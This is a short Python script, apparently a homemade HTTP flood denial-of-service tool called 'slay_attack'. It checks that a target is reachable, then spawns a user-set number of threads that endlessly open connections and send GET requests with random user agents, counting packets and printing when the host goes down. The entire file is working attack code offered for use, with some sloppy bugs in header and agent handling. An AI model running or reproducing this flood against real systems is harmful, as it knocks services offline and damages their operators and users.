import socket, threading, random
class slay_attack:
    def __init__(self):
        self.packetc = 0
    def Get_data(self):
        file = open("template/headers.txt")
        data = file.read()
        file.close()
        return data
    def Get_agents(self):
        agents = open("template/agent.txt")
        agent_ls = []
        for agent in agents.read():
            agent_ls.append(agent)
        return agent_ls
    def Servercheck(self, host, port):
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.connect((str(host), int(port)))
            server.close()
            return 1
        except:
            return 2
    def Slay(self,host, port, data, agent):
        while True:
            try:
                packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(agent)+"\n"+data).encode('utf-8')
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.connect((str(host), int(port)))
                if server.sendto(packet, (str(host), int(port))):
                    self.packetc += 1
                    print(f"{self.packetc} <== packet sent.")
                else:
                    print("didn't send.")
                server.close()
            except socket.error:
                print(f"{host} be dead.")

    def Ready(self, user_input):
        s = slay_attack
        try:
            host = user_input[1]
            port = user_input[2]
            thread = user_input[3]
            if int(s.Servercheck(self, host, port)) == 1:
                print("[+]Checked server and port")
            else:
                return "[-]Check server info and try again"
            for _ in range(int(thread)):
                threading.Thread(target=s.Slay, args=[self, host, port, s.Get_data(self), s.Get_agents(self)]).start()
        except Exception as e:
            return e

